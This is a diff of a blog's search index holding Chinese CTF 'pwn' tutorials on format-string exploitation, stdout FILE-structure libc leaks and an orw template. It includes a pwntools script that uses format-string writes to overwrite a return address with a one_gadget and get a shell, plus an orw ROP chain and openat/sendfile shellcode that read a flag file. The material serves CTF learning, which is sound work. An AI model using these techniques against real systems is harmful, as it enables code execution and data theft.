@@ -1,41 +1,143 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>_IO_2_1_stdout_</title>
-    <url>/2024/07/19/IO_2_1_stdout/</url>
+    <title>format利用</title>
+    <url>/2024/07/20/Fmt/</url>
     <content><![CDATA[<hr>
-<h1 id="IO-2-1-stdout-的利用（速成）"><a href="#IO-2-1-stdout-的利用（速成）" class="headerlink" title="_IO_2_1_stdout_的利用（速成）"></a>_IO_2_1_stdout_的利用（速成）</h1><p>详情可看：<br><a href="https://blog.csdn.net/qq_41202237/article/details/113845320">hollk</a> </p>
-<p><a href="https://bbs.kanxue.com/thread-275968.htm#msg_header_h1_2">国资</a></p>
-<h3 id="IO-FILE-plus结构体"><a href="#IO-FILE-plus结构体" class="headerlink" title="_IO_FILE_plus结构体"></a>_IO_FILE_plus结构体</h3><pre><code>struct _IO_FILE_plus &#123;
-    FILE file;
-    const struct _IO_jump_t *vtable;
-&#125;
+<h1 id="格式化字符串利用"><a href="#格式化字符串利用" class="headerlink" title="格式化字符串利用"></a>格式化字符串利用</h1><span id="more"></span>
+<p>详细学习关于fmt的利用手法推荐b站国资，以及星盟</p>
+<p>关于非栈上格式化字符串的利用在ctf中还是利用比较频繁的 ，可以仔细去学习这一专项。</p>
+<p>tips:<br>1、寄存器顺序：rdi、rsi、rdx、rcx、r8、r9.<br>1、%c<br>2、%s<br>3、%p<br>4、%n，%hhn，%hn<br>5、%a<br>这个命令是利用于在程序开启  “FORTIFY“  时，所有的printf都会被_printf_chk所替代。  </p>
+<p>_printf_chk与printf主要有以下几点不同：   </p>
+<pre><code>1、在使用%n$p时要连续进行打印，如打印%1$p,就需要%1$p,%2$p连续使用。
+2、在使用%n时会进行一些检查。
 </code></pre>
-<p>其中32 位的file到 vtable 偏移为 0x94，64 位偏移为 0xd8</p>
+<p>这时如果程序加了字数限制，漏洞利用就会变得很麻烦。<br>所以这里采用  %a  来进行泄露，但是不同的 是%a是泄露数据，并且是泄露上方的数据与其他格式化字符串截然相反的泄露方向。</p>
+<p>6、*<br>eg：%*7$c+%6$hnn<br>上面这个例子的作用就是将栈上第7个的位置的值直接输入到6p这个位置。<br>通常用于read字节较少的情况。<br><br><br><br></p>
+<h2 id="栈上格式化字符串（原理）"><a href="#栈上格式化字符串（原理）" class="headerlink" title="栈上格式化字符串（原理）"></a>栈上格式化字符串（原理）</h2><h3 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h3><p>1、由于在32位程序中，系统并不是采用的寄存器传参，所以关于printf的所有参数都会显示在栈上。<br>如同<br><img src="/images/format_stack.png" alt="图片"><br>其中依次存储的数据是prinf的内容、参数1、参数2、printf的返回地址。<br>如果我们用printf来打印其中的地址：</p>
+<pre><code>printf(&quot;%p,%p&quot;,&quot;test&quot;,&amp;a);
+</code></pre>
+<p>首先程序会对函数依次进行以下操作：  </p>
+<pre><code>1、读取内容   
+2、如果遇到的是普通字符串则输入到缓冲区中      
+3、如果遇到的是以%开头或转义字符，则程序进行解析，并作出与之对应的操作    
+</code></pre>
+<p>进行完这些程序就会打印出下面的结果<br><img src="/images/result.png" alt="图片"><br>第一个地址是“test”的地址，第二个地址是变量a的地址。<br>根据以上的规律我们不难发现利用%p，pritnf就会依次从esp-4的位置打印出地址。<br> 同时我们也可以了解到在使用类如  ”%n$p”  的n参数代表的是相较于格式化字符串的相对位置。</p>
+<p>根据以上的例子我们可以知道printf的基本原理，那么利用printf也就一目了然了，printf的利用也是无非在原理的基础利用程序本身的逻辑漏洞，或函数漏洞来进行攻击。<br><br><br><br></p>
+<h3 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h3><p>1、在64位程序中我们知道，程序改为先用寄存器来进行依次传参，所以原本的</p>
+<pre><code>printf(&quot;%p,%p&quot;,&quot;test&quot;,&amp;a);
+</code></pre>
+<p>就会将%p先存储在rdi中然后剩下的参数就按顺序依次存储在剩下的5个寄存器中。  </p>
+<p>所以64位中若是想要泄露栈上的地址应该要先从  %6$p 开始。  </p>
+<p>2、除了寄存器传参剩下就和32位程序一致了。   </p>
 <br>
+<br>   
+                        
+<p>2、<br>先可以通过例题回忆一下<br>DASCTF<br><img src="/images/dactf_fmtN.png" alt="图片"><br>类似这种read的变量非栈上时，并且只有一个main函数时，就可以利用改写ret的地址为onegadget。   </p>
+<pre><code>!/usr/bin/python3
+from pwn import *
+from LibcSearcher import *
+import os
 
-<h3 id="IO-2-1-stdout-结构体"><a href="#IO-2-1-stdout-结构体" class="headerlink" title="_IO_2_1_stdout_结构体"></a>_IO_2_1_stdout_结构体</h3><p><img src="/images/stdout.png" alt="图片">   </p>
-<p>关于利用stdout来泄露libc主要设置以下结构的值：   </p>
-<pre><code>1、flag为0xfbad18xx，一般为0xfdab1800
+context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)
+# context(os=&#39;linux&#39;, arch=&#39;i386&#39;, log_level=&#39;debug&#39;)
 
-2、更改_IO_read_ptr、_IO_read_end、_IO_read_base指针的值为0.
 
-3、_IO_write_base改为需要泄露的地址，_IO_write_ptr改为泄露地址的终止值。
+#context.terminal = [&#39;xterm&#39;, &#39;-e&#39;]
+context.terminal = [&#39;xfce4-terminal&#39;, &#39;-e&#39;]
+#终端更换
+
+p=process(&quot;./pwn&quot;)
+p= remote(&#39;node5.buuoj.cn&#39;,28406)
+libc = ELF(&quot;libc.so.6&quot;)
+elf = ELF(&quot;./pwn&quot;)
+
+def op():
+    gdb.attach(p)
+    pause()
+
+def inter():
+    p.interactive()
+    
+def sa(content,payload):
+    p.sendafter(content,payload)
+    
+def sla(content,payload):
+    p.sendlineafter(content,payload)
+
+def uc64():
+    u64(p.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b&#39;\x00&#39;))
+
+def uc32():
+    u32(p.recvuntil(b&quot;\xf7&quot;)[-4:].ljust(4,b&#39;\x00&#39;))
+
+def exec_fmt(pad):#自动获取到fmt的pad
+    p = process(&quot;./fmt&quot;)
+    # send 还是 sendline以程序为准
+    p.send(pad)
+    return p.recv()
+payload=b&#39;%3$p&#39;+b&#39;%6$p&#39;
+sa(&quot;keyword&quot;,payload)
+p.recvuntil(b&#39;0x&#39;)
+got=int(p.recv(12),16)-0x10-libc.sym[&#39;read&#39;]
+print(&quot;got=&quot;,hex(got))
+p.recvuntil(b&#39;0x&#39;)
+stack=int(p.recv(12),16)-0xc8+0x10
+tar=stack+0xe0-0x100
+print(&quot;tar=&quot;,hex(tar))
+print(&quot;stack=&quot;,hex(stack))
+p.recvuntil(b&#39;0x&#39;)
+one=got+0xf1247
+print(&quot;one=&quot;,hex(one))
+
+
+payload=(b&#39;%&#39;+str(tar&amp;0xffff).encode()+b&#39;c%11$hn\x00&#39;)
+p.recvuntil(b&#39;keyword&#39;)
+print(&quot;offest=&quot;,hex(offest))
+p.send(payload)
+#改写当前链为ret的链
+
+payload=(b&#39;%&#39;+str((one&amp;0xffff)).encode()+b&#39;c%37$hn\x00&#39;)
+p.recvuntil(b&#39;keyword&#39;)
+p.send(payload)
+p.recv()
+ #改ret第二位为one
+
+payload=(b&#39;%&#39;+str((tar&amp;0xffff)+2).encode()+b&#39;c%11$hn\x00&#39;)
+p.recvuntil(b&#39;keyword&#39;)
+print(&quot;offest=&quot;,hex(offest))
+p.send(payload)
+#ret地址+2
+
+print(&quot;offest=&quot;,hex(offest))
+one=one&gt;&gt;16
+payload=(b&#39;%&#39;+str((one&amp;0xffff)).encode()+b&#39;c%37$hn\x00&#39;)
+print(&quot;offest=&quot;,hex(offest))
+p.recvuntil(b&#39;keyword&#39;)
+p.send(payload)
+#改ret地址+2的第二位地址为one
+
+inter()
 </code></pre>
-<p>改完了这些，就可以通过调用printf或者puts函数来打印出地址了。</p>
+<p>首先肯定是利用prinf先打印出栈地址和libc地址。<br>再用gdb调试看看栈的调用情况.</p>
+<p><img src="/images/gdb_fmt.png" alt="图片"></p>
+<p>可以看到ret链的是__libc_start_main函数，只有这一个所以没办法直接改。<br>不过我们看到后面有一条调用链，有两个一个以上的调用，所以可以将这个后面的调用链改成ret的调用链，即将 0x7fffffffe57c 改为 0x7fffffffe218,这样就会链上ret链。</p>
+<p><img src="/images/fmt_ret.png" alt="图片"></p>
+<p>像这样这就链起来辣！<br>链起来之后就只要修改<br><img src="/images/gdb_ret.png" alt="图片"><br>将这一部分修改为onegadget就可以了，其中在修改时很大概率不能四字节一起修，但是one与ret的地址又有三字节不相同，所以需要两字节修改两次，或者一字节修改三次。这时需要ret地址+1或2来对剩下的地址再次进行修改。        </p>
+<p>修改完之后就可以getshell了。</p>
 <hr>
 ]]></content>
       <tags>
         <tag>pwn</tag>
-        <tag>IO</tag>
-        <tag>CTF</tag>
+        <tag>fmt</tag>
       </tags>
   </entry>
   <entry>
     <title>IO</title>
     <url>/2024/07/18/IO/</url>
     <content><![CDATA[<hr>
-<h1 id="IO结构体"><a href="#IO结构体" class="headerlink" title="IO结构体"></a><strong>IO结构体</strong></h1><p>关于IO_file_jumps中函数的具体作用可以参考以下两个博客<br><a href="https://bbs.kanxue.com/thread-275968.htm#msg_header_h1_3">国资</a>和<a href="https://ray-cp.github.io/">ray-cp</a> 或者星盟的也可以      </p>
+<h1 id="IO结构体"><a href="#IO结构体" class="headerlink" title="IO结构体"></a><strong>IO结构体</strong></h1> <span id="more"></span>                                                                                 
+<p>关于IO_file_jumps中函数的具体作用可以参考以下两个博客<br><a href="https://bbs.kanxue.com/thread-275968.htm#msg_header_h1_3">国资</a>和<a href="https://ray-cp.github.io/">ray-cp</a> 或者星盟的也可以      </p>
 <br>
 <br>
 
@@ -277,138 +379,6 @@ _IO_str_jumps
         <tag>pwn</tag>
         <tag>IO</tag>
         <tag>ctf</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>format利用</title>
-    <url>/2024/07/20/Fmt/</url>
-    <content><![CDATA[<hr>
-<h1 id="格式化字符串利用"><a href="#格式化字符串利用" class="headerlink" title="格式化字符串利用"></a>格式化字符串利用</h1><span id="more"></span>
-<p>详细学习关于fmt的利用手法推荐b站国资，以及星盟</p>
-<p>关于非栈上格式化字符串的利用在ctf中还是利用比较频繁的 ，可以仔细去学习这一专项。</p>
-<p>tips:<br>1、寄存器顺序：rdi、rsi、rdx、rcx、r8、r9.<br>1、%c<br>2、%s<br>3、%p<br>4、%n，%hhn，%hn<br>5、%a<br>这个命令是利用于在程序开启  “FORTIFY“  时，所有的printf都会被_printf_chk所替代。  </p>
-<p>_printf_chk与printf主要有以下几点不同：   </p>
-<pre><code>1、在使用%n$p时要连续进行打印，如打印%1$p,就需要%1$p,%2$p连续使用。
-2、在使用%n时会进行一些检查。
-</code></pre>
-<p>这时如果程序加了字数限制，漏洞利用就会变得很麻烦。<br>所以这里采用  %a  来进行泄露，但是不同的 是%a是泄露数据，并且是泄露上方的数据与其他格式化字符串截然相反的泄露方向。</p>
-<p>6、*<br>eg：%*7$c+%6$hnn<br>上面这个例子的作用就是将栈上第7个的位置的值直接输入到6p这个位置。<br>通常用于read字节较少的情况。<br><br><br><br></p>
-<h2 id="栈上格式化字符串（原理）"><a href="#栈上格式化字符串（原理）" class="headerlink" title="栈上格式化字符串（原理）"></a>栈上格式化字符串（原理）</h2><h3 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h3><p>1、由于在32位程序中，系统并不是采用的寄存器传参，所以关于printf的所有参数都会显示在栈上。<br>如同<br><img src="/images/format_stack.png" alt="图片"><br>其中依次存储的数据是prinf的内容、参数1、参数2、printf的返回地址。<br>如果我们用printf来打印其中的地址：</p>
-<pre><code>printf(&quot;%p,%p&quot;,&quot;test&quot;,&amp;a);
-</code></pre>
-<p>首先程序会对函数依次进行以下操作：  </p>
-<pre><code>1、读取内容   
-2、如果遇到的是普通字符串则输入到缓冲区中      
-3、如果遇到的是以%开头或转义字符，则程序进行解析，并作出与之对应的操作    
-</code></pre>
-<p>进行完这些程序就会打印出下面的结果<br><img src="/images/result.png" alt="图片"><br>第一个地址是“test”的地址，第二个地址是变量a的地址。<br>根据以上的规律我们不难发现利用%p，pritnf就会依次从esp-4的位置打印出地址。<br> 同时我们也可以了解到在使用类如  ”%n$p”  的n参数代表的是相较于格式化字符串的相对位置。</p>
-<p>根据以上的例子我们可以知道printf的基本原理，那么利用printf也就一目了然了，printf的利用也是无非在原理的基础利用程序本身的逻辑漏洞，或函数漏洞来进行攻击。<br><br><br><br></p>
-<h3 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h3><p>1、在64位程序中我们知道，程序改为先用寄存器来进行依次传参，所以原本的</p>
-<pre><code>printf(&quot;%p,%p&quot;,&quot;test&quot;,&amp;a);
-</code></pre>
-<p>就会将%p先存储在rdi中然后剩下的参数就按顺序依次存储在剩下的5个寄存器中。  </p>
-<p>所以64位中若是想要泄露栈上的地址应该要先从  %6$p 开始。  </p>
-<p>2、除了寄存器传参剩下就和32位程序一致了。   </p>
-<br>
-<br>   
-                        
-<p>2、<br>先可以通过例题回忆一下<br>DASCTF<br><img src="/images/dactf_fmtN.png" alt="图片"><br>类似这种read的变量非栈上时，并且只有一个main函数时，就可以利用改写ret的地址为onegadget。   </p>
-<pre><code>!/usr/bin/python3
-from pwn import *
-from LibcSearcher import *
-import os
-
-context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)
-# context(os=&#39;linux&#39;, arch=&#39;i386&#39;, log_level=&#39;debug&#39;)
-
-
-#context.terminal = [&#39;xterm&#39;, &#39;-e&#39;]
-context.terminal = [&#39;xfce4-terminal&#39;, &#39;-e&#39;]
-#终端更换
-
-p=process(&quot;./pwn&quot;)
-p= remote(&#39;node5.buuoj.cn&#39;,28406)
-libc = ELF(&quot;libc.so.6&quot;)
-elf = ELF(&quot;./pwn&quot;)
-
-def op():
-    gdb.attach(p)
-    pause()
-
-def inter():
-    p.interactive()
-    
-def sa(content,payload):
-    p.sendafter(content,payload)
-    
-def sla(content,payload):
-    p.sendlineafter(content,payload)
-
-def uc64():
-    u64(p.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b&#39;\x00&#39;))
-
-def uc32():
-    u32(p.recvuntil(b&quot;\xf7&quot;)[-4:].ljust(4,b&#39;\x00&#39;))
-
-def exec_fmt(pad):#自动获取到fmt的pad
-    p = process(&quot;./fmt&quot;)
-    # send 还是 sendline以程序为准
-    p.send(pad)
-    return p.recv()
-payload=b&#39;%3$p&#39;+b&#39;%6$p&#39;
-sa(&quot;keyword&quot;,payload)
-p.recvuntil(b&#39;0x&#39;)
-got=int(p.recv(12),16)-0x10-libc.sym[&#39;read&#39;]
-print(&quot;got=&quot;,hex(got))
-p.recvuntil(b&#39;0x&#39;)
-stack=int(p.recv(12),16)-0xc8+0x10
-tar=stack+0xe0-0x100
-print(&quot;tar=&quot;,hex(tar))
-print(&quot;stack=&quot;,hex(stack))
-p.recvuntil(b&#39;0x&#39;)
-one=got+0xf1247
-print(&quot;one=&quot;,hex(one))
-
-
-payload=(b&#39;%&#39;+str(tar&amp;0xffff).encode()+b&#39;c%11$hn\x00&#39;)
-p.recvuntil(b&#39;keyword&#39;)
-print(&quot;offest=&quot;,hex(offest))
-p.send(payload)
-#改写当前链为ret的链
-
-payload=(b&#39;%&#39;+str((one&amp;0xffff)).encode()+b&#39;c%37$hn\x00&#39;)
-p.recvuntil(b&#39;keyword&#39;)
-p.send(payload)
-p.recv()
- #改ret第二位为one
-
-payload=(b&#39;%&#39;+str((tar&amp;0xffff)+2).encode()+b&#39;c%11$hn\x00&#39;)
-p.recvuntil(b&#39;keyword&#39;)
-print(&quot;offest=&quot;,hex(offest))
-p.send(payload)
-#ret地址+2
-
-print(&quot;offest=&quot;,hex(offest))
-one=one&gt;&gt;16
-payload=(b&#39;%&#39;+str((one&amp;0xffff)).encode()+b&#39;c%37$hn\x00&#39;)
-print(&quot;offest=&quot;,hex(offest))
-p.recvuntil(b&#39;keyword&#39;)
-p.send(payload)
-#改ret地址+2的第二位地址为one
-
-inter()
-</code></pre>
-<p>首先肯定是利用prinf先打印出栈地址和libc地址。<br>再用gdb调试看看栈的调用情况.</p>
-<p><img src="/images/gdb_fmt.png" alt="图片"></p>
-<p>可以看到ret链的是__libc_start_main函数，只有这一个所以没办法直接改。<br>不过我们看到后面有一条调用链，有两个一个以上的调用，所以可以将这个后面的调用链改成ret的调用链，即将 0x7fffffffe57c 改为 0x7fffffffe218,这样就会链上ret链。</p>
-<p><img src="/images/fmt_ret.png" alt="图片"></p>
-<p>像这样这就链起来辣！<br>链起来之后就只要修改<br><img src="/images/gdb_ret.png" alt="图片"><br>将这一部分修改为onegadget就可以了，其中在修改时很大概率不能四字节一起修，但是one与ret的地址又有三字节不相同，所以需要两字节修改两次，或者一字节修改三次。这时需要ret地址+1或2来对剩下的地址再次进行修改。        </p>
-<p>修改完之后就可以getshell了。</p>
-<hr>
-]]></content>
-      <tags>
-        <tag>pwn</tag>
-        <tag>fmt</tag>
       </tags>
   </entry>
   <entry>
@@ -761,108 +731,39 @@ inter()
 ]]></content>
       <tags>
         <tag>pwn</tag>
-        <tag>CTF</tag>
         <tag>heap</tag>
+        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
-    <title>orw模板</title>
-    <url>/2024/08/10/orw%E6%A8%A1%E6%9D%BF/</url>
-    <content><![CDATA[<h1 id="orw-模板"><a href="#orw-模板" class="headerlink" title="orw 模板"></a>orw 模板</h1><h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a><em>tips</em></h3><p>liunx64：<br>1、read 0、readv 19<br>2、write 1、writev 20<br>3、open 2、openat 257<br>4、sendfile 40    </p>
+    <title>_IO_2_1_stdout_</title>
+    <url>/2024/07/19/IO_2_1_stdout/</url>
+    <content><![CDATA[<hr>
+<h1 id="IO-2-1-stdout-的利用（速成）"><a href="#IO-2-1-stdout-的利用（速成）" class="headerlink" title="_IO_2_1_stdout_的利用（速成）"></a>_IO_2_1_stdout_的利用（速成）</h1><p>详情可看：<br><a href="https://blog.csdn.net/qq_41202237/article/details/113845320">hollk</a> </p>
+<p><a href="https://bbs.kanxue.com/thread-275968.htm#msg_header_h1_2">国资</a></p>
+<h3 id="IO-FILE-plus结构体"><a href="#IO-FILE-plus结构体" class="headerlink" title="_IO_FILE_plus结构体"></a>_IO_FILE_plus结构体</h3><pre><code>struct _IO_FILE_plus &#123;
+    FILE file;
+    const struct _IO_jump_t *vtable;
+&#125;
+</code></pre>
+<p>其中32 位的file到 vtable 偏移为 0x94，64 位偏移为 0xd8</p>
 <br>
- 
-<h2 id="orw的原型及参数"><a href="#orw的原型及参数" class="headerlink" title="orw的原型及参数"></a>orw的原型及参数</h2><pre><code>1. read
-原型: ssize_t read(int fd, void *buf, size_t count);
-参数:
-fd：文件描述符。
-buf：指向存储读取数据的缓冲区的指针。
-count：要读取的字节数。      
 
-2. readv
-原型: ssize_t readv(int fd, const struct iovec *iov, int iovcnt);
-参数:
-fd：文件描述符。
-iov：指向 iovec 结构体数组的指针，每个 iovec 结构体包含一个缓冲区及其大小。
-iovcnt：iovec 结构体的数量。  
+<h3 id="IO-2-1-stdout-结构体"><a href="#IO-2-1-stdout-结构体" class="headerlink" title="_IO_2_1_stdout_结构体"></a>_IO_2_1_stdout_结构体</h3><p><img src="/images/stdout.png" alt="图片">   </p>
+<p>关于利用stdout来泄露libc主要设置以下结构的值：   </p>
+<pre><code>1、flag为0xfbad18xx，一般为0xfdab1800
 
-3. write
-原型: ssize_t write(int fd, const void *buf, size_t count);
-参数:
-fd：文件描述符。
-buf：指向要写入的数据的缓冲区的指针。
-count：要写入的字节数。
+2、更改_IO_read_ptr、_IO_read_end、_IO_read_base指针的值为0.
 
-4. writev
-原型: ssize_t writev(int fd, const struct iovec *iov, int iovcnt);
-参数:
-fd：文件描述符。
-iov：指向 iovec 结构体数组的指针，每个 iovec 结构体包含一个缓冲区及其大小。
-iovcnt：iovec 结构体的数量。
-
-5. open
-原型: int open(const char *pathname, int flags, mode_t mode);
-参数:
-pathname：要打开的文件的路径。
-flags：打开文件的标志，如 O_RDONLY、O_WRONLY、O_RDWR。
-mode：文件权限，仅在使用 O_CREAT 标志时需要。
-
-6. openat
-原型: int openat(int dirfd, const char *pathname, int flags, mode_t mode);
-参数:
-dirfd：目录文件描述符，表示相对路径的基准目录（可以是 AT_FDCWD）。
-pathname：要打开的文件的路径。
-flags：打开文件的标志，如 O_RDONLY、O_WRONLY、O_RDWR。
-mode：文件权限，仅在使用 O_CREAT 标志时需要。
-
-7. sendfile
-原型: ssize_t sendfile(int out_fd, int in_fd, off_t *offset, size_t count);
-参数:
-out_fd：目标文件描述符（通常是套接字）。
-in_fd：源文件描述符。
-offset：偏移量的指针，用于指定从源文件中开始的字节位置（如果为 NULL，从当前文件位置开始）。
-count：要发送的字节数。
+3、_IO_write_base改为需要泄露的地址，_IO_write_ptr改为泄露地址的终止值。
 </code></pre>
-<h3 id="模版"><a href="#模版" class="headerlink" title="模版"></a><em>模版</em></h3><p>只禁用了execve   </p>
-<pre><code>o=base+libc.sym[&#39;open&#39;]
-r=base+libc.sym[&#39;read&#39;]
-w=base+libc.sym[&#39;write&#39;]
-orw=p64(rdi)+p64(flag)+p64(rsi)+p64(0)+p64(o)
-orw+=p64(rdi)+p64(3)+p64(rsi)+p64(flag)+p64(rdx_r)+p64(0x30)+p64(0)+p64(r)
-orw+=p64(rdi)+p64(1)+p64(rsi)+p64(flag)+p64(rdx_r)+p64(0x30)+p64(0)+p64(w)
-</code></pre>
-<p>其中的寄存器的呈现形式及赋值视情况而变动。</p>
- <br>
- 禁用open、execve、read、write、readv、writev
-
-<pre><code>asm(&#39;&#39;&#39;
-mov rdi,3;                    #openat调用
-mov rdx,0;
-mov r10,0;
-mov rsi,flag;                 #flag地址
-mov rax,257;
-syscall;
-
-mov rdi,0;                    #sendfile调用  
-mov rsi,3;
-mov rdi,1;
-xor rdx,rdx;
-mov r10,0x33;                 #读取大小
-mov rax,40;
-syscall;
-
-
-mov rax,60;                    #exit调用
-xor rdi,rdi;
-syscall;
-&#39;&#39;&#39;
-)
-</code></pre>
-<p>其中指令的表现形式也视具体情况而变动。</p>
+<p>改完了这些，就可以通过调用printf或者puts函数来打印出地址了。</p>
+<hr>
 ]]></content>
       <tags>
         <tag>pwn</tag>
-        <tag>ctf</tag>
-        <tag>orw</tag>
+        <tag>IO</tag>
+        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -1044,6 +945,106 @@ _wide_data-&gt;_wide_vtable-&gt;overflow设置为地址C用于劫持RIP，即满
         <tag>pwn</tag>
         <tag>IO</tag>
         <tag>house of</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>orw模板</title>
+    <url>/2024/08/10/orw%E6%A8%A1%E6%9D%BF/</url>
+    <content><![CDATA[<h1 id="orw-模板"><a href="#orw-模板" class="headerlink" title="orw 模板"></a>orw 模板</h1><h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a><em>tips</em></h3><p>liunx64：<br>1、read 0、readv 19<br>2、write 1、writev 20<br>3、open 2、openat 257<br>4、sendfile 40    </p>
+<br>
+ 
+<h2 id="orw的原型及参数"><a href="#orw的原型及参数" class="headerlink" title="orw的原型及参数"></a>orw的原型及参数</h2><pre><code>1. read
+原型: ssize_t read(int fd, void *buf, size_t count);
+参数:
+fd：文件描述符。
+buf：指向存储读取数据的缓冲区的指针。
+count：要读取的字节数。      
+
+2. readv
+原型: ssize_t readv(int fd, const struct iovec *iov, int iovcnt);
+参数:
+fd：文件描述符。
+iov：指向 iovec 结构体数组的指针，每个 iovec 结构体包含一个缓冲区及其大小。
+iovcnt：iovec 结构体的数量。  
+
+3. write
+原型: ssize_t write(int fd, const void *buf, size_t count);
+参数:
+fd：文件描述符。
+buf：指向要写入的数据的缓冲区的指针。
+count：要写入的字节数。
+
+4. writev
+原型: ssize_t writev(int fd, const struct iovec *iov, int iovcnt);
+参数:
+fd：文件描述符。
+iov：指向 iovec 结构体数组的指针，每个 iovec 结构体包含一个缓冲区及其大小。
+iovcnt：iovec 结构体的数量。
+
+5. open
+原型: int open(const char *pathname, int flags, mode_t mode);
+参数:
+pathname：要打开的文件的路径。
+flags：打开文件的标志，如 O_RDONLY、O_WRONLY、O_RDWR。
+mode：文件权限，仅在使用 O_CREAT 标志时需要。
+
+6. openat
+原型: int openat(int dirfd, const char *pathname, int flags, mode_t mode);
+参数:
+dirfd：目录文件描述符，表示相对路径的基准目录（可以是 AT_FDCWD）。
+pathname：要打开的文件的路径。
+flags：打开文件的标志，如 O_RDONLY、O_WRONLY、O_RDWR。
+mode：文件权限，仅在使用 O_CREAT 标志时需要。
+
+7. sendfile
+原型: ssize_t sendfile(int out_fd, int in_fd, off_t *offset, size_t count);
+参数:
+out_fd：目标文件描述符（通常是套接字）。
+in_fd：源文件描述符。
+offset：偏移量的指针，用于指定从源文件中开始的字节位置（如果为 NULL，从当前文件位置开始）。
+count：要发送的字节数。
+</code></pre>
+<h3 id="模版"><a href="#模版" class="headerlink" title="模版"></a><em>模版</em></h3><p>只禁用了execve   </p>
+<pre><code>o=base+libc.sym[&#39;open&#39;]
+r=base+libc.sym[&#39;read&#39;]
+w=base+libc.sym[&#39;write&#39;]
+orw=p64(rdi)+p64(flag)+p64(rsi)+p64(0)+p64(o)
+orw+=p64(rdi)+p64(3)+p64(rsi)+p64(flag)+p64(rdx_r)+p64(0x30)+p64(0)+p64(r)
+orw+=p64(rdi)+p64(1)+p64(rsi)+p64(flag)+p64(rdx_r)+p64(0x30)+p64(0)+p64(w)
+</code></pre>
+<p>其中的寄存器的呈现形式及赋值视情况而变动。</p>
+ <br>
+ 禁用open、execve、read、write、readv、writev
+
+<pre><code>asm(&#39;&#39;&#39;
+mov rdi,3;                    #openat调用
+mov rdx,0;
+mov r10,0;
+mov rsi,flag;                 #flag地址
+mov rax,257;
+syscall;
+
+mov rdi,0;                    #sendfile调用  
+mov rsi,3;
+mov rdi,1;
+xor rdx,rdx;
+mov r10,0x33;                 #读取大小
+mov rax,40;
+syscall;
+
+
+mov rax,60;                    #exit调用
+xor rdi,rdi;
+syscall;
+&#39;&#39;&#39;
+)
+</code></pre>
+<p>其中指令的表现形式也视具体情况而变动。</p>
+]]></content>
+      <tags>
+        <tag>pwn</tag>
+        <tag>ctf</tag>
+        <tag>orw</tag>
       </tags>
   </entry>
 </search>
